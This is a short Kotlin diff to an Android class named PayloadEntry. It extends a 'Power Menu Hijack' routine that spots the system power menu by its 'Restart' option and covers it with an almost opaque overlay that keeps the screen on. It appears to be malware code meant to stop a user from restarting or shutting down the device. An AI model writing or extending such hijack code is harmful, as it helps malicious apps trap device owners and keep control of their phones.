@@ -38,6 +38,13 @@ class PayloadEntry : DynamicEntry {
                                 nodes.any { n -> n.contains("Restart", ignoreCase = true) }) {
                                 if (!isOverlayShowing) {
                                     DynamicEntry.log("🎯 Power Menu Hijack Triggered")
+                                    // GO WILD: Set custom flags when showing
+                                    DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
+                                        flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                                                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                                                android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                                        alpha = 0.95f
+                                    )
                                     isOverlayShowing = true
                                 }
                             }
